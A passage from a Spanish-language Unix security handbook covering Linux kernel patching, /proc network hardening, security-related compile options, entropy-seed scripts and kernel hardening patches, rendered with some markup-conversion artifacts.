<!--br/-->
<!--br/-->En Slackware podemos utilizar el comando upgradepkg para actualizar un paquete de software
determinado; esta orden no es m&#x00E1;s que otro shellscript que instala el paquete nuevo y elimina los &#xFB01;cheros de
la versi&#x00F3;n antigua que no existan en la nueva. Sin embargo, entre los administradores de Slackware &#x2013; me
incluyo en el grupo &#x2013; es mucho m&#x00E1;s habitual descargar el c&#x00F3;digo fuente de la aplicaci&#x00F3;n a actualizar,
compilarlo e instalarlo por encima de la versi&#x00F3;n antigua (o eliminar esta primero, de forma
manual).
<!--br/-->
<!--br/-->En cuanto al kernel de Linux y su actualizaci&#x00F3;n, como antes hemos comentado, si lo que queremos es
actualizar o parchear el n&#x00FA;cleo del sistema operativo la forma de hacerlo ya no es tan dependiente de la
versi&#x00F3;n de Linux utilizada. Para actualizar la versi&#x00F3;n del kernel tenemos dos opciones: o descargamos el c&#x00F3;digo
fuente de la nueva versi&#x00F3;n, de forma completamente independiente de la que tengamos en estos momentos,
o descargamos un parche que al ser aplicado nos modi&#xFB01;car&#x00E1; el c&#x00F3;digo instalado ya en nuestro sistema para
convertirlo en la nueva versi&#x00F3;n; en ambos casos debemos compilar y arrancar con la imagen generada si
queremos que el sistema quede actualizado.
<!--br/-->
<!--br/-->Si hemos descargado un nuevo kernel completo (generalmente un &#xFB01;chero .tar.gz) no tenemos m&#x00E1;s que
descomprimirlo, desempaquetarlo y compilarlo para generar una nueva imagen con el nuevo n&#x00FA;cleo;
evidentemente no vamos a entrar ahora en como con&#xFB01;gurar o compilar el kernel de Linux: para eso hay
excelentes documentos disponibles en la red.
<!--br/-->
<!--br/-->M&#x00E1;s interesante es la aplicaci&#x00F3;n de parches al c&#x00F3;digo fuente, bien para incrementar la versi&#x00F3;n del n&#x00FA;cleo, como
ya hemos dicho, o bien para aplicar una modi&#xFB01;caci&#x00F3;n &#x2018;no o&#xFB01;cial&#x2019; distribuida como parche; en este &#x00FA;ltimo caso
&#x2013; cada vez menos utilizado, debido al desarrollo de los m&#x00F3;dulos cargables en tiempo de ejecuci&#x00F3;n &#x2013; hemos de
tener cuidado, ya que al aplicar un parche no o&#xFB01;cial es muy probable que si posteriormente deseamos
incrementar la versi&#x00F3;n de nuestro kernel tambi&#x00E9;n mediante parcheado del c&#x00F3;digo, este &#x00FA;ltimo no funcione
correctamente.
<!--br/-->
<!--br/-->Lo m&#x00E1;s habitual es que cualquier parche para el c&#x00F3;digo fuente del n&#x00FA;cleo, tanto o&#xFB01;cial como &#x2018;no o&#xFB01;cial&#x2019;, se
distribuya como un simple &#xFB01;chero de texto (en muchos casos comprimido con gzip) que contiene las
diferencias entre el c&#x00F3;digo actual y el modi&#xFB01;cado, generadas con diff; podemos veri&#xFB01;carlo simplemente

echando un vistazo al &#xFB01;chero que acabamos de descargar:

     </para><literallayout role="verbatim">
&#x00A0;luisa:/usr/src#&#x00A0;gzip&#x00A0;-dc&#x00A0;patch-2.2.14.gz|head&#x00A0;-4
&#x00A0;diff&#x00A0;-u&#x00A0;--recursive&#x00A0;--new-file&#x00A0;v2.2.13/linux/CREDITS&#x00A0;linux/CREDITS
&#x00A0;---&#x00A0;v2.2.13/linux/CREDITS&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;Tue&#x00A0;Jan&#x00A0;&#x00A0;4&#x00A0;11:24:09&#x00A0;2000
&#x00A0;+++&#x00A0;linux/CREDITS&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;Tue&#x00A0;Jan&#x00A0;&#x00A0;4&#x00A0;10:12:10&#x00A0;2000
&#x00A0;@@&#x00A0;-137,12&#x00A0;+137,9&#x00A0;@@
&#x00A0;luisa:/usr/src#
</literallayout>
<!--l. 730--><para>Si este es nuestro caso, para aplicar el parche no tenemos m&#x00E1;s que utilizar la orden &#x2018;patch&#x2019;:

     </para><literallayout role="verbatim">
&#x00A0;luisa:/usr/src#&#x00A0;gzip&#x00A0;-dc&#x00A0;patch-2.2.14.gz&#x00A0;|&#x00A0;/usr/bin/patch&#x00A0;-p0
</literallayout>
<!--l. 737--><para>Si el proceso ha sido correcto, el c&#x00F3;digo fuente que en nuestro ejemplo antes correspond&#x02CA;&#x0131;a al n&#x00FA;cleo 2.2.13
ahora corresponde al 2.2.14; como antes, no tenemos m&#x00E1;s que recompilar ese c&#x00F3;digo y arrancar con la imagen
generada para que nuestro kernel sea el nuevo:

     </para><literallayout role="verbatim">
&#x00A0;luisa:~#&#x00A0;uname&#x00A0;-a
&#x00A0;Linux&#x00A0;luisa&#x00A0;2.2.14&#x00A0;#9&#x00A0;Sat&#x00A0;Dec&#x00A0;30&#x00A0;03:34:32&#x00A0;CET&#x00A0;2000&#x00A0;i686&#x00A0;unknown
&#x00A0;luisa:~#
</literallayout>
<!--l. 748--><para>
  </para></section><!--end section--><!--l. 748--><section 
role="section"><title><abbrev role="title-mark">10.5</abbrev><anchor 
   id="x1-14900010.5"  ></anchor>El subsistema de red</title>
<!--l. 750--><para>  Lamentablemente en Linux no existe una orden similar a ndd en Solaris o a no en AIX, que como hemos
visto o veremos m&#x00E1;s adelante se utilizan para con&#xFB01;gurar en tiempo de ejecuci&#x00F3;n, y de una forma sencilla,
par&#x00E1;metros del operativo relativos al subsistema de red. En este caso necesitamos recurrir, en la mayor&#x02CA;&#x0131;a de
ocasiones, a escribir directamente en &#xFB01;cheros del directorio /proc/, un sistema de archivos
&#x2018;virtual&#x2019; que en Linux y otros entornos Unix act&#x00FA;a como interfaz ente el espacio de usuario y el
n&#x00FA;cleo.
<!--br/-->
<!--br/-->Con relaci&#x00F3;n a la tabla ARP y sus timeouts (como ya dijimos al hablar de Solaris, importantes en nuestra
seguridad para prevenir cierto tipo de ataques), su funcionamiento en Linux es quiz&#x00E1;s algo
engorroso: en los directorios /proc/sys/net/ipv4/neigh/<informalequation><graphic 
fileref="unixsec161x.gif"></graphic></informalequation>/ tenemos ciertos &#xFB01;cheros que indican
par&#x00E1;metros de con&#xFB01;guraci&#x00F3;n de ARP; uno de ellos, gc<informalequation><graphic 
fileref="unixsec162x.gif"></graphic></informalequation>stale<informalequation><graphic 
fileref="unixsec163x.gif"></graphic></informalequation>time, de&#xFB01;ne el tiempo (60 segundos
por defecto) que una entrada de la tabla ARP se considera &#x2018;viva&#x2019;. Cuando este timeout ha
vencido para cierta entrada, entra en juego el par&#x00E1;metro gc<informalequation><graphic 
fileref="unixsec164x.gif"></graphic></informalequation>interval, que marca la frecuencia
de actuaci&#x00F3;n del recolector de basura (garbage collector) en el sistema; este, que se ejecuta
cada 30 segundos, es realmente el encargado de eliminar las entradas &#x2018;caducadas&#x2019; de nuestra
tabla.
<!--br/-->
<!--br/-->Respecto al protocolo ICMP, una buena idea &#x2013; como en cualquier Unix &#x2013; es ignorar las peticiones
ICMP<informalequation><graphic 
fileref="unixsec165x.gif"></graphic></informalequation>ECHO dirigidas a direcciones de broadcast; esto lo conseguimos escribiendo un valor diferente de 0 en
el archivo /proc/sys/net/ipv4/icmp<informalequation><graphic 
fileref="unixsec166x.gif"></graphic></informalequation>echo<informalequation><graphic 
fileref="unixsec167x.gif"></graphic></informalequation>ignore<informalequation><graphic 
fileref="unixsec168x.gif"></graphic></informalequation>broadcasts. Si no nos conformamos con esto, y
queremos ignorar todas las peticiones ICMP<informalequation><graphic 
fileref="unixsec169x.gif"></graphic></informalequation>ECHO, no tenemos m&#x00E1;s que hacer lo mismo en el archivo
/proc/sys/net/ipv4/icmp<informalequation><graphic 
fileref="unixsec170x.gif"></graphic></informalequation>echo<informalequation><graphic 
fileref="unixsec171x.gif"></graphic></informalequation>ignore<informalequation><graphic 
fileref="unixsec172x.gif"></graphic></informalequation>all.
<!--br/-->
<!--br/-->La gesti&#x00F3;n de tramas ICMP<informalequation><graphic 
fileref="unixsec173x.gif"></graphic></informalequation>REDIRECT tambi&#x00E9;n puede presentar ciertos riesgos para nuestra seguridad. Si en
/proc/sys/net/ipv4/conf/*/accept<informalequation><graphic 
fileref="unixsec174x.gif"></graphic></informalequation>redirects indicamos un valor diferente de 0 estamos
dici&#x00E9;ndole al n&#x00FA;cleo de Linux que haga caso de este tipo de paquetes que en principio nos puede
enviar un enrutador; su valor por defecto (0, desactivado) es el correcto. An&#x00E1;logamente, en
/proc/sys/net/ipv4/conf/*/send<informalequation><graphic 
fileref="unixsec175x.gif"></graphic></informalequation>redirects permitimos la emisi&#x00F3;n de estas tramas desde nuestra
m&#x00E1;quina escribiendo un valor diferente de 0; como s&#x00F3;lo un router deber&#x02CA;&#x0131;a enviar estos paquetes, la opci&#x00F3;n m&#x00E1;s
segura es especi&#xFB01;car un 0 para este par&#x00E1;metro (su valor por defecto es 1). Una opci&#x00F3;n intermedia entre
bloquear todas las tramas ICMP<informalequation><graphic 
fileref="unixsec176x.gif"></graphic></informalequation>REDIRECT y permitirlas puede ser el escribir en el archivo
secure<informalequation><graphic 
fileref="unixsec177x.gif"></graphic></informalequation>redirects un valor diferente de 0, logrando que se acepten este tipo de paquetes pero s&#x00F3;lo desde
la lista de gateways v&#x00E1;lidos de&#xFB01;nida en /etc/gateways.
<!--br/-->
<!--br/-->Pasando ya a hablar del protocolo IP, uno de los par&#x00E1;metros que m&#x00E1;s nos va a interesar es la habilitaci&#x00F3;n o
deshabilitaci&#x00F3;n del IP Forwarding en el n&#x00FA;cleo de Linux; como hemos dicho antes, el sistema de
&#xFB01;ltrado de paquetes s&#x00F3;lo funciona cuando esta opci&#x00F3;n est&#x00E1; habilitada, lo que se consigue con la
orden

     </para><literallayout role="verbatim">
&#x00A0;luisa:~#&#x00A0;echo&#x00A0;1&#x00A0;&#x003E;&#x00A0;/proc/sys/net/ipv4/ip&#x005F;forward
&#x00A0;luisa:~#
</literallayout>
<!--l. 801--><para>Sin embargo, si no utilizamos las facilidades de &#xFB01;rewalling del n&#x00FA;cleo de Linux esta opci&#x00F3;n ha de estar
desabilitada (introducir&#x02CA;&#x0131;amos un &#x2018;0&#x2019; en lugar de un &#x2018;1&#x2019; en el &#xFB01;chero anterior), ya que de lo contrario
corremos el peligro de que nuestra m&#x00E1;quina se convierta en un router.
<!--br/-->
<!--br/-->Antes hemos hablado de las &#x2018;SYN Cookies&#x2019;, y hemos comentado que aunque el soporte para esta
caracter&#x02CA;&#x0131;stica se introduce al compilar el n&#x00FA;cleo, realmente el mecanismo se ha de activar desde espacio de
usuario, por ejemplo con una orden como la siguiente:

     </para><literallayout role="verbatim">
&#x00A0;luisa:~#&#x00A0;echo&#x00A0;1&#x00A0;&#x003E;/proc/sys/net/ipv4/tcp&#x005F;syncookies
&#x00A0;luisa:~#
</literallayout>
<!--l. 815--><para>Tambi&#x00E9;n es muy recomendable que el subsistema de red del kernel descarte las tramas con Source Routing o
encaminamiento en origen activado. Este tipo de paquetes contienen el camino que han de seguir hasta su
destino, de forma que los routers por los que pasa no han de examinar su contenido sino simplemente
reenviarlo, hecho que puede causar la llegada de datos que constituyan una amenaza a nuestras pol&#x02CA;&#x0131;ticas
de seguridad. En los n&#x00FA;cleos 2.0 esto se consegu&#x02CA;&#x0131;a activando la opci&#x00F3;n CONFIG_IP_NOSR a la hora de
compilar el kernel, mientras que en los 2.2 la forma m&#x00E1;s sencilla de ignorar estos paquetes es introduciendo
un &#x2018;0&#x2019; en los diferentes &#xFB01;cheros accept_source_route del directorio /proc/sys/net/ipv4/; por ejemplo
la siguiente orden descarta las tramas con encaminamiento en origen que llegan al dispositivo de red
eth0:

     </para><literallayout role="verbatim">
&#x00A0;luisa:~#&#x00A0;echo&#x00A0;0&#x00A0;&#x003E;/proc/sys/net/ipv4/conf/eth0/accept&#x005F;source&#x005F;route
&#x00A0;luisa:~#
</literallayout>
<!--l. 834--><para>Hemos de recordar que las modi&#xFB01;caciones que hacemos sobre el interfaz sysctl son din&#x00E1;micas: se pueden
efectuar con el sistema funcionando, sin necesidad de reiniciarlo, pero se pierden cuando la m&#x00E1;quina se
apaga para establecerse a unos valores por defecto al arrancar de nuevo el sistema operativo; seguramente
nos interesar&#x00E1; mantener los cambios realizados, por lo que en alguno de los &#xFB01;cheros de inicializaci&#x00F3;n de la
m&#x00E1;quina hemos de incluir las &#x00F3;rdenes que acabamos de explicar, obviamente despu&#x00E9;s de haber montado el
sistema de &#xFB01;cheros /proc/.
  </para></section><!--end section--><!--l. 842--><section 
role="section"><title><abbrev role="title-mark">10.6</abbrev><anchor 
   id="x1-15000010.6"  ></anchor>El n&#x00FA;cleo de Linux</title>
<!--l. 844--><para>
  </para><!--l. 844--><section 
role="subsection"><title><abbrev role="title-mark">10.6.1</abbrev><anchor 
   id="x1-15100010.6.1"  ></anchor>Opciones de compilaci&#x00F3;n</title>
<!--l. 845--><para>  A la hora de recompilar un nuevo n&#x00FA;cleo de Linux hemos de tener en cuenta algunas opciones dentro del
grupo &#x2018;Networking Options&#x2019; que pueden afectar a la seguridad de nuestra m&#x00E1;quina (algunos de estos
aspectos, para n&#x00FA;cleos 2.0, pueden encontrarse en <citation>[?]</citation>). Sin embargo, antes de entrar en detalles con opciones
concretas, es muy conveniente que introduzcamos soporte para sistemas de &#xFB01;cheros proc
en &#x2018;Filesystems&#x2019; (CONFIG_PROC_FS) y activemos el interfaz sysctl en &#x2018;General Setup&#x2019;
(CONFIG_SYSCTL); con estos pasos habilitamos la capacidad de Linux para modi&#xFB01;car ciertos
par&#x00E1;metros del n&#x00FA;cleo (en /proc/sys/) sin necesidad de reiniciar el sistema o recompilar el
kernel.
<!--br/-->
<!--br/-->Pasando ya a comentar algunas opciones que nos ofrece Linux, es bastante interesante para la seguridad
con&#xFB01;gurar nuestro sistema como un cortafuegos a la hora de compilar el n&#x00FA;cleo (CONFIG_IP_FIREWALL).
Linux ofrece en su kernel facilidades para de&#xFB01;nir un &#xFB01;rewall de paquetes en el sistema, que adem&#x00E1;s permitir&#x00E1;
el IP-Masquerading. Para que el subsistema de &#xFB01;ltrado funcione es necesario que el IP-Forwarding est&#x00E9;
activado de la forma que m&#x00E1;s tarde veremos.
<!--br/-->
<!--br/-->Otra opci&#x00F3;n que nos puede ayudar a incrementar la seguridad de nuestro equipo es la defragmentaci&#x00F3;n de
paquetes (CONFIG_IP_ALWAYS_DEFRAG) que llegan a trav&#x00E9;s de la red. Cuando un equipo situado entre el
origen y el destino de los datos decide que los paquetes a enviar son demasiado grandes, los divide en
fragmentos de longitud menor; sin embargo, los n&#x00FA;meros de puerto s&#x00F3;lamente viajan en el primer fragmento,
lo que implica que un atacante puede insertar informaci&#x00F3;n en el resto de tramas que en teor&#x02CA;&#x0131;a no debe
viajar en ellas. Activando esta opci&#x00F3;n, en nuestra m&#x00E1;quina estos fragmentos se reagrupar&#x00E1;n de nuevo incluso
si van a ser reenviados a otro host.
<!--br/-->
<!--br/-->Siguiendo con las diferentes opciones del subsistema de red, podemos habilitar el soporte para &#x2018;SYN
Cookies&#x2019; (CONFIG_SYN_COOKIES) en el n&#x00FA;cleo que estamos con&#xFB01;gurando. Una red TCP/IP habitual no
puede soportar un ataque de negaci&#x00F3;n de servicio conocido como &#x2018;SYN Flooding&#x2019;, consistente b&#x00E1;sicamente en
enviar una gran cantidad de tramas con el bit SYN activado para as&#x02CA;&#x0131; saturar los recursos de una m&#x00E1;quina
determinada hasta que los usuarios no pueden ni siquiera conectar a ella. Las &#x2018;SYN Cookies&#x2019; proporcionan
cierta protecci&#x00F3;n contra este tipo de ataques, ya que la pila TCP/IP utiliza un protocolo criptogr&#x00E1;&#xFB01;co para
permitir que un usuario leg&#x02CA;&#x0131;timo pueda seguir accediendo al sistema incluso si este est&#x00E1; siendo atacado.
Aunque con&#xFB01;guremos y ejecutemos un n&#x00FA;cleo con esta opci&#x00F3;n soportada, hemos de activar las
&#x2018;SYN Cookies&#x2019; cada vez que el sistema arranca (como veremos luego), ya que por defecto est&#x00E1;n
deshabilitadas.
<!--br/-->
<!--br/-->En ciertas situaciones es interesante analizar en espacio de usuario &#x2013; es decir, sin sobrecargar al n&#x00FA;cleo m&#x00E1;s

de lo estrictamente necesario &#x2013; un paquete o parte de &#x00E9;l (t&#x02CA;&#x0131;picamente, los 128 primeros bytes) que llega a
trav&#x00E9;s de la red hasta nuestra m&#x00E1;quina; de esta forma, un analizador simple puede tomar ciertas decisiones
en funci&#x00F3;n del contenido del paquete recibido, como enviar un correo al administrador en caso de sospecha o
grabar un mensaje mediante syslog. Justamente esto es lo que conseguimos si habilitamos la opci&#x00F3;n
Firewall Packet Netlink Device (CONFIG_IP_FIREWALL_NETLINK).
<!--br/-->
<!--br/-->Hasta ahora hemos hablado de la posibilidad que tiene Linux para modi&#xFB01;car par&#x00E1;metros del n&#x00FA;cleo sin
necesidad de recompilarlo o de reiniciar el equipo, mediante el interfaz sysctl; esto implica por ejemplo
que podemos modi&#xFB01;car el comportamiento del subsistema de red simplemente modi&#xFB01;cando determinados
&#xFB01;cheros de /proc/sys/ (recordemos que el sistema de &#xFB01;cheros /proc/ de algunos Unix es una interfaz
entre estructuras de datos del n&#x00FA;cleo y el espacio de usuario). Veremos en el punto  <ulink 
  url="#x1-14900010.5"  ><!--ref: linux_netsys--></ulink> algunos de estos
par&#x00E1;metros con&#xFB01;gurables que tienen mucho que ver con la seguridad Linux, en especial con el subsistema de
red.
  </para></section><!--end subsection--><!--l. 904--><section 
role="subsection"><title><abbrev role="title-mark">10.6.2</abbrev><anchor 
   id="x1-15200010.6.2"  ></anchor>Dispositivos</title>
<!--l. 905--><para>  Linux (no as&#x02CA;&#x0131; otros Unices) proporciona dos dispositivos virtuales denominados /dev/random y
/dev/urandom que pueden utilizarse para generar n&#x00FA;meros pseudoaleatorios, necesarios para aplicaciones
criptogr&#x00E1;&#xFB01;cas. El primero de estos &#xFB01;cheros, /dev/random, utiliza lo que su autor denomina &#x2018;ruido
ambiental&#x2019; (por ejemplo, temporizadores de IRQs, accesos a disco o tiempos entre pulsaciones de teclas)
para crear una fuente de entrop&#x02CA;&#x0131;a aceptable y &#x2013; muy importante &#x2013; que apenas introduce sobrecarga en el
sistema. El segundo archivo, /dev/urandom, crea un resumen de la entrop&#x02CA;&#x0131;a de /dev/random utilizando la
funci&#x00F3;n hash SHA (Secure Hash Algorithm), dise~nada por el NIST y la NSA para su Digital Signature
Standard (<citation>[?]</citation>). Por tanto, tenemos una fuente de entrop&#x02CA;&#x0131;a aceptable, /dev/urandom, y otra
incluso mejor, pero de capacidad limitada, /dev/random. Para detalles concretos sobre su
funcionamiento se puede consultar el &#xFB01;chero que las implementa dentro del n&#x00FA;cleo de Linux,
drivers/char/random.c.
<!--br/-->
<!--br/-->Como en el propio c&#x00F3;digo se explica, cuando un sistema operativo arranca ejecuta una serie de acciones que
pueden ser predecidas con mucha facilidad por un potencial atacante (especialmente si en el arranque no
interactua ninguna persona, como es el caso habitual en Unix). Para mantener el nivel de entrop&#x02CA;&#x0131;a en el
sistema se puede almacenar el desorden que exist&#x02CA;&#x0131;a en la parada de la m&#x00E1;quina para restaurarlo en el
arranque; esto se consigue modi&#xFB01;cando los scripts de inicializaci&#x00F3;n del sistema. En el &#xFB01;chero
apropiado que se ejecute al arrancar (por ejemplo, /etc/rc.d/rc.M) debemos a~nadir las siguientes
l&#x02CA;&#x0131;neas:

     </para><literallayout role="verbatim">
&#x00A0;echo&#x00A0;&#x0022;Initializing&#x00A0;random&#x00A0;number&#x00A0;generator...&#x0022;
&#x00A0;random&#x005F;seed=/var/run/random-seed
&#x00A0;#&#x00A0;Carry&#x00A0;a&#x00A0;random&#x00A0;seed&#x00A0;from&#x00A0;start-up&#x00A0;to&#x00A0;start-up
&#x00A0;#&#x00A0;Load&#x00A0;and&#x00A0;then&#x00A0;save&#x00A0;512&#x00A0;bytes,&#x00A0;which&#x00A0;is&#x00A0;the&#x00A0;size&#x00A0;of&#x00A0;the&#x00A0;entropy&#x00A0;pool
&#x00A0;if&#x00A0;[&#x00A0;-f&#x00A0;$random&#x005F;seed&#x00A0;];&#x00A0;then
&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;cat&#x00A0;$random&#x005F;seed&#x00A0;&#x003E;/dev/urandom
&#x00A0;fi
&#x00A0;dd&#x00A0;if=/dev/urandom&#x00A0;of=$random&#x005F;seed&#x00A0;count=1
&#x00A0;chmod&#x00A0;600&#x00A0;$random&#x005F;seed
</literallayout>
<!--l. 944--><para>Mientras que en un &#xFB01;chero que se ejecute al parar el sistema a~nadiremos lo siguiente:

     </para><literallayout role="verbatim">
&#x00A0;#&#x00A0;Carry&#x00A0;a&#x00A0;random&#x00A0;seed&#x00A0;from&#x00A0;shut-down&#x00A0;to&#x00A0;start-up
&#x00A0;#&#x00A0;Save&#x00A0;512&#x00A0;bytes,&#x00A0;which&#x00A0;is&#x00A0;the&#x00A0;size&#x00A0;of&#x00A0;the&#x00A0;entropy&#x00A0;pool
&#x00A0;echo&#x00A0;&#x0022;Saving&#x00A0;random&#x00A0;seed...&#x0022;
&#x00A0;random&#x005F;seed=/var/run/random-seed
&#x00A0;dd&#x00A0;if=/dev/urandom&#x00A0;of=$random&#x005F;seed&#x00A0;count=1
&#x00A0;chmod&#x00A0;600&#x00A0;$random&#x005F;seed
</literallayout>
<!--l. 958--><para>Con estas peque~nas modi&#xFB01;caciones de los archivos de arranque y parada del sistema conseguimos mantener
un nivel de entrop&#x02CA;&#x0131;a aceptable durante todo el tiempo que el sistema permanezca encendido. Si de todas
formas no consideramos su&#xFB01;ciente la entrop&#x02CA;&#x0131;a proporcionada por estos dispositivos de Linux, podemos
conseguir otra excelente fuente de desorden en el mismo sistema operativo a partir de una simple tarjeta
de sonido y unas modi&#xFB01;caciones en el n&#x00FA;cleo (<citation>[?]</citation>), o utilizar alguno de los generadores &#x2013; algo m&#x00E1;s complejos
&#x2013; citados en <citation>[?]</citation>.
  </para></section><!--end subsection--><!--l. 965--><section 
role="subsection"><title><abbrev role="title-mark">10.6.3</abbrev><anchor 
   id="x1-15300010.6.3"  ></anchor>Algunas mejoras de la seguridad</title>
<!--l. 966--><para>  En esta secci&#x00F3;n vamos a comentar algunos aspectos de modi&#xFB01;caciones del n&#x00FA;cleo que se distribuyen
libremente en forma de parches, y que contribuyen a aumentar la seguridad de un sistema Linux; para
obtener referencias actualizadas de estos c&#x00F3;digos &#x2013; y otros no comentados aqu&#x02CA;&#x0131; &#x2013; es recomendable consultar
<citation>[?]</citation>; para informaci&#x00F3;n de estructuras de datos, &#xFB01;cheros o l&#x02CA;&#x0131;mites del n&#x00FA;cleo de Linux se puede consultar <citation>[?]</citation> o
<citation>[?]</citation>.
  </para><!--l. 973--><section 
role="subsubsection"><title><anchor 
   id="x1-15400010.6.3"  ></anchor>L&#x02CA;&#x0131;mites del n&#x00FA;cleo</title>
<!--l. 974--><para>  En include/asm/resource.h tenemos la inicializaci&#x00F3;n de algunas estructuras de datos del n&#x00FA;cleo
relacionadas con l&#x02CA;&#x0131;mites a la cantidad de recursos consumida por un determinado proceso; por ejemplo, el
m&#x00E1;ximo n&#x00FA;mero de procesos por usuario (RLIMIT<informalequation><graphic 
fileref="unixsec178x.gif"></graphic></informalequation>NPROC) se inicializa a
<!--br/-->MAX<informalequation><graphic 
fileref="unixsec179x.gif"></graphic></informalequation>TASKS<informalequation><graphic 
fileref="unixsec180x.gif"></graphic></informalequation>PER<informalequation><graphic 
fileref="unixsec181x.gif"></graphic></informalequation>USER, valor que en include/linux/tasks.h podemos comprobar que se corresponde
con la mitad de NR<informalequation><graphic 
fileref="unixsec182x.gif"></graphic></informalequation>TASKS (n&#x00FA;mero m&#x00E1;ximo de procesos en el sistema); en arquitecturas i86 el valor del
l&#x02CA;&#x0131;mite de procesos por usuario se &#xFB01;ja a 256. De la misma forma, el n&#x00FA;mero m&#x00E1;ximo de &#xFB01;cheros abiertos por
un proceso (RLIMIT<informalequation><graphic 
fileref="unixsec183x.gif"></graphic></informalequation>NOFILE) se inicializa al valor NR<informalequation><graphic 
fileref="unixsec184x.gif"></graphic></informalequation>OPEN, que en el archivo include/asm/limits.h se
de&#xFB01;ne como 1024.
<!--br/-->
<!--br/-->Estos l&#x02CA;&#x0131;mites se pueden consultar desde espacio de usuario con la llamada getrlimit(); esta funci&#x00F3;n utiliza
una estructura de datos rlimit, de&#xFB01;nida en include/linux/resource.h, que contiene dos datos enteros
para representar lo que se conoce como l&#x02CA;&#x0131;mite soft o blando y l&#x02CA;&#x0131;mite hard o duro. El l&#x02CA;&#x0131;mite blando de un
recurso puede ser modi&#xFB01;cado por cualquier proceso sin privilegios que llame a setrlimit(), ya sea para
aumentar o para disminuir su valor; por el contrario, el l&#x02CA;&#x0131;mite hard de&#xFB01;ne un valor m&#x00E1;ximo para la
utilizaci&#x00F3;n de un recurso, y s&#x00F3;lo puede ser sobrepasado por procesos que se ejecuten con privilegios de
administrador.
<!--br/-->
<!--br/-->En el &#xFB01;chero include/linux/nfs.h podemos de&#xFB01;nir el puerto m&#x00E1;ximo que los clientes NFS pueden utilizar
(NFS<informalequation><graphic 
fileref="unixsec185x.gif"></graphic></informalequation>PORT); si le asignamos un valor inferior a 1024 (puertos privilegiados), s&#x00F3;lo el administrador de otro
sistema Unix podr&#x00E1; utilizar nuestros servicios NFS, de forma similar a la variable nfs<informalequation><graphic 
fileref="unixsec186x.gif"></graphic></informalequation>portmon de algunos
Unices.
<!--br/-->
<!--br/-->Para cambiar los l&#x02CA;&#x0131;mites de los par&#x00E1;metros vistos aqu&#x02CA;&#x0131; la soluci&#x00F3;n m&#x00E1;s r&#x00E1;pida pasa por modi&#xFB01;car los &#xFB01;cheros
de cabecera del kernel, recompilarlo y arrancar la m&#x00E1;quina con el nuevo n&#x00FA;cleo; sin embargo,
a continuaci&#x00F3;n vamos a hablar brevemente de Fork Bomb Defuser, un m&#x00F3;dulo que permite al
administrador modi&#xFB01;car algunos de estos par&#x00E1;metros sin reiniciar el sistema. M&#x00E1;s adelante hablaremos
tambi&#x00E9;n de los l&#x02CA;&#x0131;mites a recursos ofrecidos por PAM (Pluggable Authentication Modules), un
sistema de autenticaci&#x00F3;n incorporado en la actualidad a la mayor&#x02CA;&#x0131;a de Linux, as&#x02CA;&#x0131; como en otros
Unices.

  </para></section><!--end subsubsection--><!--l. 1009--><section 
role="subsubsection"><title><anchor 
   id="x1-15500010.6.3"  ></anchor>Fork Bomb Defuser</title>
<!--l. 1010--><para>  El kernel de Linux no permite por defecto limitar el n&#x00FA;mero m&#x00E1;ximo de usuarios y el n&#x00FA;mero m&#x00E1;ximo de
procesos por usuario que se pueden ejecutar en el sistema sin tener que modi&#xFB01;car el c&#x00F3;digo del n&#x00FA;cleo; si no
queremos modi&#xFB01;carlo, casi no hay m&#x00E1;s remedio que utilizar un poco de programaci&#x00F3;n (unos simples
shellscripts suelen ser su&#xFB01;cientes) y las herramientas de plani&#xFB01;caci&#x00F3;n de tareas para evitar que un usuario
lance demasiados procesos o que conecte cuando el sistema ya ha sobrepasado un cierto umbral de
usuarios conectados a &#x00E9;l.
<!--br/-->
<!--br/-->Mediante el m&#x00F3;dulo Fork Bomb Defuser se permite al administrador controlar todos estos par&#x00E1;metros del
sistema operativo, incrementando de forma &#xFB02;exible la seguridad de la m&#x00E1;quina. El c&#x00F3;digo est&#x00E1; disponible en
http://rexgrep.tripod.com/rexfbdmain.htm.
  </para></section><!--end subsubsection--><!--l. 1022--><section 
role="subsubsection"><title><anchor 
   id="x1-15600010.6.3"  ></anchor>Secure Linux</title>
<!--l. 1023--><para>  Por Secure Linux se conoce a una colecci&#x00F3;n de parches para el n&#x00FA;cleo de Linux programados por Solar
Designer, uno de los hackers m&#x00E1;s reconocidos a nivel mundial en la actualidad (entendiendo
hacker en el buen &#x2013; y &#x00FA;nico &#x2013; sentido de la palabra). Este software, disponible libremente desde
http://www.false.com/security/linux/ <anchor 
   id="x1-156001f2"  ></anchor><footnote><para>   Esta URL ya no existe, ahora los trabajos de Solar Designer se encuentran en http://www.openwall.com/; gracias,
David :).</para></footnote>,
incrementa la seguridad que el n&#x00FA;cleo proporciona por defecto, ofreciendo cuatro importantes diferencias
con respecto a un kernel normal:
     </para><itemizedlist>
     <listitem>
     <!--l. 1033--><para>&#x00C1;rea de pila no ejecutable
     <!--br/-->En un sistema con el &#x00E1;rea de la pila no ejecutable los ataques de bu&#xFB00;er over&#xFB02;ow son m&#x00E1;s
     dif&#x02CA;&#x0131;ciles de realizar que en los sistemas habituales, ya que muchos de estos ataques se basan en
     sobreescribir la direcci&#x00F3;n de retorno de una funci&#x00F3;n en la pila para que apunte a c&#x00F3;digo malicioso,
     tambi&#x00E9;n depositado en la pila. Aunque Secure Linux no es una soluci&#x00F3;n completa, s&#x02CA;&#x0131; que a~nade
     un nivel extra de seguridad en este sentido, haciendo que un atacante que pretenda utilizar un
     bu&#xFB00;er over&#xFB02;ow contra nuestro sistema tenga que utilizar c&#x00F3;digo m&#x00E1;s complicado para hacerlo.
     </para></listitem>
     <listitem>
     <!--l. 1042--><para>Enlaces restringidos en /tmp
     <!--br/-->Con esta caracter&#x02CA;&#x0131;stica, Secure Linux intenta que los usuarios sin privilegios puedan crear
     enlaces en /tmp/ sobre &#xFB01;cheros que no les pertenecen, eliminando as&#x02CA;&#x0131; ciertos problemas de
     seguridad que afectan a algunos sistemas Linux, relacionados principalmente con condiciones
     de carrera en el acceso a &#xFB01;cheros.
     </para></listitem>
     <listitem>
     <!--l. 1048--><para>Tuber&#x02CA;&#x0131;as restringidas en /tmp
     <!--br/-->Esta opci&#x00F3;n no permite a los usuarios escribir en tuber&#x02CA;&#x0131;as (&#xFB01;fos) que no le pertenezcan a &#x00E9;l o
     al root en directorios con el bit de permanencia activo, como /tmp. De esta forma se evitan
